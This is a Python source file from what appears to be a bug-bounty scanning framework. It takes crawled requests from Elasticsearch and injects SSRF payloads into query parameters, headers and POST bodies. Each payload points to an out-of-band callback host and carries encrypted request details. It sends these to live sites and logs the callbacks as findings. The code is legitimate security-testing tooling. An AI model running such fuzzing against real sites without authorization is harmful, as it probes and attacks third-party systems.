# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File       : fuzz_scan.py
# Time       ：2022/08/19
# version    ：python 3
# Description：

# Author：bywalks
# Blog：http://www.bywalks.com
# Github：https://github.com/bywalks
"""

import os, sys
import json
import copy
import datetime
import time
import requests
import threading
import subprocess
from urllib.parse import urlparse
from requests_toolbelt.multipart.encoder import MultipartEncoder

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from vcommon.aes import encrypt_data, decrypt_data
from vcommon.common import cmdprocess
from vcommon.ESHelper import ESHelper
from vcommon.vuln_manage import VulnManager
from vconfig.config import *
from vconfig.log import logger

CUR_DIR = os.path.dirname(os.path.abspath(__file__))
requests.packages.urllib3.disable_warnings()

class FuzzScan(object):
    def __init__(self):
        self.fuzz_resultDir = CUR_DIR + "/results/fuzz"
        self.spiderResultDir = CUR_DIR + "/results/spider"
        self.es_helper = ESHelper(ES_HOSTS, ES_USER, ES_PASSWD)
        self.scanner_name = "fuzz_scan"
        self.vuln_index = "vuln-assets-1"
        self.spider_index = "spider-assets-1"
        self.program_index = "program-assets-1"
        self.vuln_manager = VulnManager()

    def read_spider_list(self, program=None, pdomain=None, subdomain=None, url=None):
        '''根据筛选条件读取spider_data全list'''
        if subdomain != None:
            dsl = {
                "query": {
                    "bool": {
                        "must": [
                            {"match_phrase": {"subdomain": str(subdomain)}}
                        ]
                    }
                },
                "_source": ["url", "method", "headers", "data"]
            }
        elif pdomain != None:
            dsl = {
                "query": {
                    "bool": {
                        "must": [
                            {"match_phrase": {"pdomain": str(pdomain)}}
                        ]
                    }
                },
                "_source": ["url", "method", "headers", "data"]
            }
        elif program != None:
            dsl = {
                "query": {
                    "bool": {
                        "must": [
                            {"match_phrase": {"program": str(program)}}
                        ]
                    }
                },
                "_source": ["url", "method", "headers", "data"]
            }
        elif url != None:
            dsl = {
                "query": {
                    "bool": {
                        "must": [
                            {"match_phrase": {"url": str(url)}}
                        ]
                    }
                },
                "_source": ["url", "method", "headers", "data"]
            }
        else:
            dsl = {
                "query": {
                    "match_all": {}
                },
                "_source": ["url", "method", "headers", "data"]
            }
        spider_list = self.es_helper.query_domains_by_dsl(self.spider_index, dsl)
        return spider_list

    def read_pdomain_list_by_program(self, program=None):
        '''根据筛选条件读取pdomain全list'''
        dsl = {
            "query": {
                "bool": {
                    "must": [
                        {"match_phrase": {"program": str(program)}}
                    ]
                }
            },
            "_source": ["platform", "domain", "offer_bounty", "hackerone_private"]
        }
        pdomain_list = self.es_helper.query_domains_by_dsl(self.program_index, dsl)
        return pdomain_list

    def read_pdomain_list_by_program_time(self, begin_time=None, end_time=None, program=None):
        '''根据筛选条件读取url的list'''
        if begin_time==None:
            begin_time = "2010-01-01T12:10:30Z"
        if end_time==None:
            end_time = "2028-01-01T12:10:30Z"
        dsl = {
                "query": {
                    "bool": {
                        "must":
                            {"match_phrase": {"program": program}},
                        "filter": [
                            {
                                "range": {
                                    "update_time": {
                                        "gte": begin_time,
                                        "lt": end_time
                                    }
                                }
                            }
                        ]
                    }
                },
            "_source": ["domain"]
            }
        new_url_list = self.es_helper.query_domains_by_dsl(self.program_index, dsl)
        return new_url_list

    def read_pdomain_list_by_time(self, begin_time=None, end_time=None):
        '''根据筛选条件读取url的list'''
        if begin_time==None:
            begin_time = "2010-01-01T12:10:30Z"
        if end_time==None:
            end_time = "2028-01-01T12:10:30Z"
        dsl = {
                "query": {
                    "bool": {
                        "filter": [
                            {
                                "range": {
                                    "update_time": {
                                        "gte": begin_time,
                                        "lt": end_time
                                    }
                                }
                            }
                        ]
                    }
                },
            "_source": ["domain"]
            }
        new_url_list = self.es_helper.query_domains_by_dsl(self.program_index, dsl)
        return new_url_list

    '''爬虫数据去重'''
    def remove_duplicate_data(self, list_dict_data):
        copy_list = []
        for list_data in list_dict_data:
            list_data = list_data['_source']
            num = 0
            for cop in copy_list:
                if list_data['url'] == cop['url'] and list_data['method'] == cop['method'] and list_data['data'] == cop['data']:
                    num += 1
            if num == 0:
                copy_list.append(list_data)
        return copy_list

    def fuzzing(self,spider_list):
        logger.log('INFOR',"[fuzzing]")
        # 爬虫结果分阶段打入fuzz模块
        for spider_data in spider_list:
            # fuzz分get和post方式
            if spider_data['url'][:2] != "ws":
                logger.log('INFOR', spider_data['url'])
                method0 = spider_data['method']
                if method0 == "GET":
                    # self.fuzz_get_uri(spider_data, type="ssrf")
                    # self.fuzz_get_headers(spider_data, type="ssrf")
                    try:
                        self.fuzz_get_uri(spider_data, type="ssrf")
                        self.fuzz_get_headers(spider_data, type="ssrf")
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')

                if method0 == "POST":
                    try:
                        self.fuzz_post_headers(spider_data, type="ssrf")
                        self.fuzz_post_data(spider_data, type="ssrf")
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')

    def urlencodetodict(self, data):
        dic = {}
        try:
            for key_value in data.split("&"):
                key, value = key_value.split("=")
                dic[key] = value
        except Exception as error:
            logger.log('DEBUG', f'{error}')
        return dic

    def dicttodata(self, dic):
        str = ""
        for key, value in dic.items():
            str += f"{key}={value}&"
        return str

    def generate_xss_payload(self, value):
        value = value
        return value

    def generate_ssrf_payload(self, spider_data, vuln_key, vuln_method):
        urls0 = spider_data['url']
        headers0 = spider_data['headers']
        method0 = spider_data['method']
        value = ""
        if method0 == "GET":
            query = {"type": "fuzz_ssrf","url": urls0,"method": method0,"headers": headers0,"vuln_key": vuln_key,"vuln_method": vuln_method}
            query = encrypt_data(query).strip().replace("\n","")
            value = f"http://cdov8j95vj4cqij1lbj0a7mi6s88khc3h.xx.com/?{query}"
        if method0 == "POST":
            data0 = spider_data['data']
            query = {"type": "fuzz_ssrf","url": urls0,"method": method0,"headers": headers0,"vuln_key": vuln_key,"vuln_method": vuln_method,"data": data0}
            query = encrypt_data(query).strip().replace("\n","")
            value = f"http://cdov8j95vj4cqij1lbj0a7mi6s88khc3h.xx.com/?{query}"
        return value

    def fuzz_get_uri(self, spider_data, type):
        urls0 = spider_data['url']
        query = urlparse(urls0).query
        if query != None and "=" in query:
            headers0 = spider_data['headers']
            query = self.urlencodetodict(query)
            logger.log('INFOR', f'{query}')
            if type == "xss":
                for key, value in query.items():
                    q = copy.deepcopy(query)
                    q[key] = self.generate_xss_payload(value)
                    try:
                        urls0 = urls0.split("?")[0] + "?" + self.dicttodata(q)
                        requests.get(urls0, headers=headers0, timeout=3, verify=False)
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')
            if type == "ssrf":
                for key, value in query.items():
                    q = copy.deepcopy(query)
                    q[key] = self.generate_ssrf_payload(spider_data=spider_data, vuln_key = key, vuln_method="GET")
                    try:
                        urls0 = urls0.split("?")[0] + "?" + self.dicttodata(q)
                        requests.get(urls0, headers=headers0, timeout=3, verify=False)
                        print(urls0)
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')

    def fuzz_get_headers(self, spider_data, type):
        urls0 = spider_data['url']
        headers0 = spider_data['headers']
        logger.log('INFOR', f'{headers0}')
        if type == "xss":
            headers0['Referer'] = self.generate_xss_payload("h")
            headers0['User-Agent'] = self.generate_xss_payload("h")
            try:
                requests.get(urls0, headers=headers0, timeout=3, verify=False)
            except Exception as error:
                logger.log('DEBUG', f'{error}')
        if type == "ssrf":
            for key, value in headers0.items():
                q = copy.deepcopy(headers0)
                q[key] = self.generate_ssrf_payload(spider_data=spider_data, vuln_key=key, vuln_method="GET")
                try:
                    requests.get(urls0, headers=q, timeout=3, verify=False)
                except Exception as error:
                    logger.log('DEBUG', f'{error}')

    def fuzz_post_data(self, spider_data, type):
        urls0 = spider_data['url']
        data0 = spider_data['data']
        headers0 = spider_data['headers']
        logger.log('INFOR', f'{data0}')
        if data0 != None:
            data0 = self.dealdata(data0, headers0)
            if type == "ssrf":
                for key, value in data0.items():
                    q = copy.deepcopy(data0)
                    q[key] = self.generate_ssrf_payload(spider_data=spider_data, vuln_key = key, vuln_method="POST")
                    try:
                        data = self.undealdata(data=q, headers=headers0)
                        requests.post(urls0, data=data, headers=headers0, timeout=3, verify=False)
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')

    def fuzz_post_headers(self, spider_data, type):
        urls0 = spider_data['url']
        headers0 = spider_data['headers']
        data0 = spider_data['data']
        logger.log('INFOR', f'{headers0}')
        if type == "ssrf":
            for key, value in headers0.items():
                q = copy.deepcopy(headers0)
                q[key] = self.generate_ssrf_payload(spider_data=spider_data, vuln_key=key, vuln_method="Header")
                try:
                    requests.post(urls0, data=data0, headers=q, timeout=3, verify=False)
                except Exception as error:
                    logger.log('DEBUG', f'{error}')

    def dealdata(self, data, headers):
        dic = {}
        content_type = ""
        if "Content-Type" in headers:
            content_type = headers['Content-Type']
        elif "content-type" in headers:
            content_type = headers['content-type']
        else:
            content_type = "application/x-www-form-urlencoded"
        if "multipart/form-data; boundary=" in content_type:
            boundary = "--" + str(content_type.split("=")[1])
            all = data.split(boundary)
            for each in all:
                content = each.replace("\n", "")
                if "Content-Disposition" in content:
                    key = content.split('"')[1]
                    value = content.split('"')[2].strip("\r")
                    dic[key] = value
        if "application/x-www-form-urlencoded" in content_type:
            for key_value in data.split("&"):
                key, value = key_value.split("=")
                dic[key] = value
        if "application/json" in content_type:
            dic = json.loads(data)
        if "application/csp-report" in content_type:
            dic = json.loads(data)
        return dic

    def undealdata(self, data, headers):
        data0 = data
        content_type = ""
        if "Content-Type" in headers:
            content_type = headers['Content-Type']
        elif "content-type" in headers:
            content_type = headers['content-type']
        else:
            content_type = "application/x-www-form-urlencoded"
        if "multipart/form-data; boundary=" in content_type:
            data0 = MultipartEncoder(fields=data)
        if "application/x-www-form-urlencoded" in content_type:
            data0 = self.dicttodata(data)
        if "application/json" in content_type:
            data0 = data
        if "application/csp-report" in content_type:
            data0 = data
        return data0

    def write_fuzz_list(self, domain):
        fuzz_output_json = f"{self.fuzz_resultDir}/fuzz.json"
        if os.path.exists(fuzz_output_json):
            with open(fuzz_output_json, 'r') as f:
                vuln_info = {}
                vuln_info['launched_at'] = datetime.datetime.now()
                vuln_info['scan_name'] = "fuzz_scan"
                for each in f:
                    try:
                        each = json.loads(each)
                        if "GET /?" in str(each):
                            data = each['raw-request'].split(" HTTP/1.1")[0].split("&")[0].split("?")[1]
                            data = decrypt_data(data)
                            try:
                                data = json.loads(data.replace("'",'"'))
                                vuln_info['website'] = urlparse(data['url']).netloc
                                website = vuln_info['website']
                                if domain in vuln_info['website']:
                                    vuln_info['vuln_type'] = data['type']
                                    vuln_info['vuln_name'] = data['type']
                                    vuln_info['vuln_score'] = "5"
                                    vuln_info['scan_detail'] = data
                                    self.vuln_manager.generate_report(vuln_info)
                                    logger.log('INFOR', vuln_info)
                                    # 通知
                                    message = f"FUZZ模块发现SSRF漏洞 - {website}"
                                    self.vuln_manager.send_message(message=message)
                                    self.es_helper.insert_one_doc(self.vuln_index, vuln_info)
                            except Exception as error:
                                logger.log('DEBUG', f'{error}')
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')
                logger.log('INFOR',f'[+]fuzz[{domain}]扫描完毕')

    def write_fuzz_list1(self):
        fuzz_output_json = f"{self.fuzz_resultDir}/fuzz.json"
        if os.path.exists(fuzz_output_json):
            with open(fuzz_output_json, 'r') as f:
                vuln_info = {}
                vuln_info['launched_at'] = datetime.datetime.now()
                vuln_info['scan_name'] = "fuzz_scan"
                for each in f:
                    try:
                        each = json.loads(each)
                        if "GET /?" in str(each):
                            data = each['raw-request'].split(" HTTP/1.1")[0].split("&")[0].split("?")[1]
                            data = decrypt_data(data)
                            try:
                                data = json.loads(data.replace("'",'"'))
                                vuln_info['website'] = urlparse(data['url']).netloc
                                vuln_info['vuln_type'] = data['type']
                                vuln_info['vuln_name'] = data['type']
                                vuln_info['vuln_score'] = "5"
                                vuln_info['scan_detail'] = data
                                self.vuln_manager.generate_report(vuln_info)
                                logger.log('INFOR', vuln_info)
                                # 通知
                                message = f"FUZZ模块发现SSRF漏洞 - {vuln_info['website']}"
                                self.vuln_manager.send_message(message=message)
                                self.es_helper.insert_one_doc(self.vuln_index, vuln_info)
                            except Exception as error:
                                logger.log('DEBUG', f'{error}')
                    except Exception as error:
                        logger.log('DEBUG', f'{error}')
                logger.log('INFOR',f'[+]fuzz扫描完毕')

    def startfuzz(self, program=None, pdomain=None, subdomain=None, url=None):
        # 输入program和subdomain
        spider_list = None
        if program != None:
            spider_list = self.read_spider_list(program=program)
        if pdomain != None:
            spider_list = self.read_spider_list(pdomain=pdomain)
        if subdomain != None:
            spider_list = self.read_spider_list(subdomain=subdomain)
        if url != None:
            spider_list = self.read_spider_list(url=url)
        if spider_list!=None:
            logger.log('INFOR',"[Fuzz]start fuzz dispatching ....")
            # 去除重复数据
            spider_list = self.remove_duplicate_data(spider_list)
            # 开始fuzz
            self.fuzzing(spider_list)
        else:
            logger.log('INFOR', "[Fuzz]spider_list is None ....")


    def deal_domain_name(self, domain_name):
        if domain_name.startswith('wss:') or "<" in domain_name:
            return
        else:
            if domain_name.startswith('*.'):
                domain_name = domain_name.replace('*.', '')
            if domain_name.startswith("http"):
                domain_name = urlparse(domain_name).netloc
            if "/" in domain_name:
                domain_name = domain_name.split("/")[0]
        return domain_name

if __name__ == "__main__":
    '''
    fuzz_scan = FuzzScan()
    # fuzz_scan.write_fuzz_list1()
    pdomain_list = fuzz_scan.read_pdomain_list_by_time(begin_time="2022-01-01",end_time="2022-09-01")
    file_len = len(pdomain_list)
    i = 1
    for pdomain in pdomain_list:
        pdomain = pdomain['_source']['domain']
        pdomain = fuzz_scan.deal_domain_name(domain_name=pdomain)
        if pdomain != None:
            logger.log('INFOR', "[Fuzz] 开始扫描第" + str(i) + "/" + str(file_len) + "-" + str(pdomain))
            fuzz_scan.startfuzz(pdomain=pdomain)
            time.sleep(1)
            fuzz_scan.write_fuzz_list(domain=pdomain)
        i = i + 1
    '''
    pass

